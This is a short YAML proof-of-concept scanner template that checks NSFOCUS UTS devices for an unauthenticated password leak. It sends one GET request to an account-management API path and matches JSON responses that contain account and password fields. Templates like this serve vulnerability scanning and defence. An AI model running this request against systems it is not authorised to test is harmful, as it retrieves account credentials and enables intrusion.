detail:
  author: MrP01ntSun(https://github.com/MrPointSun)
  links:
  - https://blog.csdn.net/DFMASTER/article/details/108547352
expression: r0()
manual: true
name: poc-yaml-nsfocus-uts-password-leak
rules:
  r0:
    expression: response.status == 200 && response.content_type.contains("json") &&
      response.body.bcontains(b"account") && response.body.bcontains(b"password")
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /webapi/v1/system/accountmanage/account
transport: http
